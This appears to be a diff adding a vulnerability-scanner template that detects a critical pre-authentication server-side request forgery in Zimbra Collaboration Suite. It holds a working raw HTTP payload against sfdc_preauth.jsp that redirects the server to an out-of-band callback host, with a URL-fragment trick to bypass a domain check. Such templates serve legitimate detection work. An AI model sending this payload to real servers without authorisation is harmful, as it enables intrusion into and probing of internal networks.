@@ -1,0 +1,22 @@
+id: zimbra-preauth-ssrf
+
+info:
+  name: Zimbra Collaboration Suite - Server-Side Request Forgery
+  author: HuanXiong
+  severity: critical
+
+  tags: SSRF
+
+http:
+  - raw:
+      - |
+        GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
